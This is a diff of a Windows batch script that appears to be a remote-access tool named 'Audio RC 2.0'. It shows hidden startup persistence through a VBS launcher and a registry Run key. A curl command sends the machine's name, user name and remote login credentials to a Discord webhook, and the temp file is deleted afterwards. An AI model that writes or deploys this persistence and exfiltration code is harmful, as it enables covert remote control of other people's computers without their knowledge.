@@ -149,7 +149,9 @@ IF NOT defined PATHS.curl SET PATHS.curl=curl.EXE
 :: </DOWNLOAD FILES>
 
 :: <ADD TO STARTUP>
->"%appdata%\Audio RC\Version !version!\startup.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& "%appdata%\Audio RC\Version !version!\Audio RC 2.0.bat", 0
+if not exist "%appdata%\Audio RC\Version !version!\startup.vbs" (
+    >"%appdata%\Audio RC\Version !version!\startup.vbs" echo CreateObject^("Wscript.Shell"^).Run """" ^& "%appdata%\Audio RC\Version !version!\Audio RC 2.0.bat", 0
+)
 reg add "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Audio RC" /d "cmd /c cscript //nologo """%appdata%\Audio RC\Version !version!\startup.vbs"""" /f >nul 2>&1
 :: </ADD TO STARTUP>
 
@@ -208,7 +210,8 @@ if defined Arg[1] (
     )
     if "!ValidWebhook!"=="true" (
      >"%temp%\DiscordMsg.json" echo {"content":"","embeds":[{"title":"Audio RC - Version !Version!","color":12740351,"description":"``%computername%\\%username%`` _has just ran the command that leads to this webhook, login details below_ :heart_eyes:\n\n🔒 __**REMOTE LOGIN CREDENTIALS**__\n_**LOGIN NAME:**_ [!HOST.ID!](https://rentry.co/!HOST.ID!)\n_**PASSWORD:**_ ``!HOST.EDIT_CODE!``\n\n🔽 __**DOWNLOAD REMOTE SCRIPT**__\n_To login you must install the remote script_\n**-** Download the [archive](https://github.com/agamsol/Audio-RC/blob/2.0/REMOTE/Remote%%20Archive.zip?raw=true)\n**-** Extract the files into a folder\n**-** Run the file `REMOTE.bat`\n**-** Enter the credentials above to login\n","timestamp":"","author":{},"image":{},"thumbnail":{},"footer":{},"fields":[]}],"components":[]}
-     "!PATHS.curl!" !Request! -skH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\DiscordMsg.json"  "!Webhook!"
+     "!PATHS.curl!" !Request! -skH "Content-Type: multipart/form-data" -F "payload_json=<%temp%\DiscordMsg.json" "!Webhook!"
+     del /s /q "%temp%\DiscordMsg.json" >nul 2>&1
     )
 )
 
